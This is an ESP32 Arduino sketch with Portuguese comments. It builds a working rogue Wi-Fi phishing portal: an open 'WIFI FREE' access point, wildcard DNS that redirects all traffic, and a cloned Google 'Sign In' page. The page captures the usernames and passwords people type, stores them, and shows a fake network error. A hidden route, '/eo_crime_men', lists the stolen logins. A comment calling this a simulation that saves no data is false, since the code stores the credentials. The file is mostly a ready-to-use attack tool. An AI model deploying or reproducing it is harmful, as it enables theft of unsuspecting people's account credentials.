#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

// Configurações do ponto de acesso
const char* ssid = "WIFI FREE";
const char* password = "";

// Configuração do DNS e servidor web
const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
WebServer server(80);

// Array para armazenar os logins
String users[10]; // Capacidade para até 10 usuários
int userIndex = 0; // Índice para o próximo login a ser armazenado

const char* erroPage = R"rawliteral(
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Erro de Rede</title>
    <style>
        /* Estilo para a tela inteira */
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f1f1f1;
            font-family: Arial, sans-serif;
        }

        /* Container para a mensagem de erro */
        .error-container {
            text-align: center;
            background-color: #ff4d4d;
            color: #fff;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            max-width: 500px;
            width: 100%;
        }

        /* Estilo para o título */
        h1 {
            font-size: 30px;
            margin-bottom: 20px;
        }

        /* Estilo para a mensagem */
        p {
            font-size: 18px;
            margin-top: 0;
        }

        /* Estilo para o botão */
        .retry-button {
            margin-top: 20px;
            padding: 10px 20px;
            font-size: 16px;
            background-color: #ff6666;
            border: none;
            border-radius: 5px;
            color: #fff;
            cursor: pointer;
        }

        .retry-button:hover {
            background-color: #ff3333;
        }
    </style>
</head>
<body>
    <div class="error-container">
        <h1>Erro na Rede</h1>
        <p>Ocorreu um erro ao tentar conectar-se à rede.</p>
        <button class="retry-button" onclick="window.location.reload();">Tentar Novamente</button>
    </div>
</body>
</html>
)rawliteral";


// Página HTML simples
const char* loginPage = R"rawliteral(
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Form</title>
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,400;0,500;0,600;0,700;0,800;1,300;1,400;1,500;1,600;1,700;1,800&display=swap');


body {
    margin: 0;
    padding: 0;
    background-size: cover;
    font-family: 'Open Sans', sans-serif;
}

.box {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 30rem;
    padding: 3.5rem;
    box-sizing: border-box;
    border: 1px solid #dadce0;
    -webkit-border-radius: 8px;
    border-radius: 8px;
    
}

.box h2 {
    margin: 0px 0 -0.125rem;
    padding: 0;
    text-align: center;
    color: #202124;
    font-size: 24px;
    font-weight: 400;
}

.box .logo 
{
    display: flex;
    flex-direction: row;
    justify-content: center;
    margin-bottom: 16px;
    
}

.box p {
    font-size: 16px;
    font-weight: 400;
    letter-spacing: 1px;
    line-height: 1.5;
    margin-bottom: 24px;
    text-align: center;
}

.box .inputBox {
    position: relative;
}

.box .inputBox input {
    width: 93%;
    padding: 1.3rem 10px;
    font-size: 1rem;
   letter-spacing: 0.062rem;
   margin-bottom: 1.875rem;
   border: 1px solid #ccc;
   background: transparent;
   border-radius: 4px;
}

.box .inputBox label {
    position: absolute;
    top: 0;
    left: 10px;
    padding: 0.625rem 0;
    font-size: 1rem;
    color: gray;
    pointer-events: none;
    transition: 0.5s;
}

.box .inputBox input:focus ~ label,
.box .inputBox input:valid ~ label,
.box .inputBox input:not([value=""]) ~ label {
    top: -1.125rem;
    left: 10px;
    color: #1a73e8;
    font-size: 0.75rem;
    background-color: #fff;
    height: 10px;
    padding-left: 5px;
    padding-right: 5px;
}

.box .inputBox input:focus {
    outline: none;
    border: 2px solid #1a73e8;
}

.box input[type="submit"] {
    border: none;
    outline: none;
    color: #fff;
    background-color: #1a73e8;
    padding: 0.625rem 1.25rem;
    cursor: pointer;
    border-radius: 0.312rem;
    font-size: 1rem;
    float: right;
  }
  
  .box input[type="submit"]:hover {
    background-color: #287ae6;
    box-shadow: 0 1px 1px 0 rgba(66,133,244,0.45), 0 1px 3px 1px rgba(66,133,244,0.3);
  }

footer {
	position: fixed;
	bottom: 0;
	left: 0;
	right: 0;
	text-align: center;
	letter-spacing: 1px;
}

footer i {
	color: red;
}

footer a {
	color: #3C97BF;
	text-decoration: none;
}
  </style>
</head>
<body>

    <div class="box">
        <div class="logo">
            <svg class="logo_svg" viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" class="l5Lhkf"><g id="qaEJec"><path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path></g><g id="YGlOvc"><path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path></g><g id="BWfIk"><path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path></g><g id="e6m3fd"><path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path></g><g id="vbkDmc"><path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path></g><g id="idEJde"><path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path></g></svg>  <!-- It doesn't have to be this long, I was just lazy to download the svg -->
        </div>
    <h2>Sign In</h2>
    <p>Use your Google Account</p>
  <form method="post" action="/submit">
        <div class="inputBox">
          <input type="username" name="username" required value="">
          <label>Username</label>
        </div>
        <div class="inputBox">
              <input type="password" name="password" required value="">
              <label>Password</label>
            </div>
        <a href="#"><input type="submit" name="sign-in" value="Sign In"></a>  <!-- Redirect links can be used in the anchor tag -->
      </form>
    </div>

    
</body>
</html>
)rawliteral";

// Redireciona qualquer página para o Captive Portal
void redirectToCaptivePortal() {
  server.sendHeader("Location", "http://192.168.4.1/", true);
  server.send(302, "text/plain", ""); // Redireciona para o servidor local
}

// Página principal (formulário de login)
void handleRoot() {
  server.send(200, "text/html", loginPage);
}

// Captura do envio (simulação sem salvar dados)
void handleSubmit() {
  String username = server.arg("username");
  String password = server.arg("password");

  // Armazena o login (se houver espaço no array)
  if (userIndex < 10) {
    users[userIndex] = username + " | " + password; 
    userIndex++;
    Serial.println("Novo login armazenado:");
    Serial.println("Usuário: " + username);
    Serial.println("Senha: " + password);
  }

  server.send(200, "text/html", erroPage);
}

// Exibir os logins armazenados
void handleDisplayLogins() {
  String response = "<h1>Logins Armazenados:</h1><ul>";
  
  for (int i = 0; i < userIndex; i++) {
    response += "<li>" + users[i] + "</li>";
  }
  
  response += "</ul>";
  server.send(200, "text/html", response);
}

void setup() {
  Serial.begin(115200);

  // Configurar o ponto de acesso
  WiFi.softAP(ssid, password);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  Serial.println("Ponto de acesso iniciado!");
  Serial.print("SSID: ");
  Serial.println(ssid);

  // Configurar DNS para redirecionar todo tráfego para o ESP32
  dnsServer.start(DNS_PORT, "*", apIP);

  // Configuração do servidor
  server.on("/", handleRoot);           // Página inicial
  server.on("/submit", HTTP_POST, handleSubmit); // Captura de envio
  server.on("/eo_crime_men", handleDisplayLogins); // Exibe os logins na rota /642657258258
  server.onNotFound(redirectToCaptivePortal);   // Redireciona páginas desconhecidas
  server.begin();
  Serial.println("Servidor iniciado!");
}

void loop() {
  dnsServer.processNextRequest(); // Processa requisições DNS
  server.handleClient();          // Processa requisições HTTP
}
